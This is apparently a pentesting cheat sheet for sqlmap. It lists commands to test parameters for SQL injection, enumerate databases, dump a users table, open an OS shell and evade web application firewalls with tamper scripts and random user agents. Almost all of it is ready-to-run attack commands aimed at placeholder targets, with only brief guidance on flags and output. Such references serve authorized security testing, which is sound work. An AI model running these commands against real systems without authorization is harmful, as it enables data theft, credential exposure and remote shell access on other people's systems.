# sqlmap — SQL Injection Automation

## When to use
After manually confirming a parameter might be injectable (error-based clue, boolean difference, time delay). sqlmap automates exploitation and data extraction.

## Key commands
```bash
# Test a GET parameter
sqlmap -u "https://TARGET/api/items?id=1" --batch --level=3 --risk=2 --threads=4 \
  --headers="Authorization: Bearer TOKEN"

# Test a POST parameter (JSON)
sqlmap -u "https://TARGET/api/search" --method POST \
  --data='{"query":"test"}' --headers="Content-Type: application/json\nAuthorization: Bearer TOKEN" \
  --batch --level=3 --risk=2

# Test a POST parameter (form)
sqlmap -u "https://TARGET/login" --method POST \
  --data="username=admin&password=test" --batch --level=3 --risk=2

# Test specific parameter only
sqlmap -u "https://TARGET/api/items?id=1&type=all" -p id --batch

# Enumerate databases
sqlmap -u "https://TARGET/api/items?id=1" --dbs --batch --headers="Authorization: Bearer TOKEN"

# Enumerate tables in a database
sqlmap -u "https://TARGET/api/items?id=1" -D database_name --tables --batch

# Dump specific table
sqlmap -u "https://TARGET/api/items?id=1" -D database_name -T users --dump --batch

# OS shell (if stacked queries supported)
sqlmap -u "https://TARGET/api/items?id=1" --os-shell --batch

# Specific techniques only (faster if you know the type)
# B=boolean, E=error, U=union, S=stacked, T=time, Q=inline
sqlmap -u "https://TARGET/api/items?id=1" --technique=BEUST --batch
```

## Key flags
- `--batch` non-interactive (accept defaults)
- `--level=3` test more injection points (cookies, user-agent, referer)
- `--risk=2` try riskier payloads (OR-based, heavy time delays)
- `--threads=4` parallel requests (max 10)
- `--tamper=space2comment,between` bypass WAF with encoding tricks
- `--random-agent` randomize User-Agent
- `--proxy=http://127.0.0.1:8080` route through proxy (for logging)
- `--dbms=mysql|postgresql|mssql|oracle|sqlite` hint the DBMS type

## Output
- Results saved in `~/.local/share/sqlmap/output/TARGET/`
- Log file, dumped tables as CSV, injection point details

## Notes
- NEVER run sqlmap blindly on all parameters — first confirm injection manually
- `--level=3 --risk=2` is a good balance; level 5 risk 3 is very noisy
- If WAF blocks: try `--tamper=space2comment,between,randomcase`
- For API testing, always pass auth headers
- sqlmap auto-detects DBMS but hinting with `--dbms` speeds things up
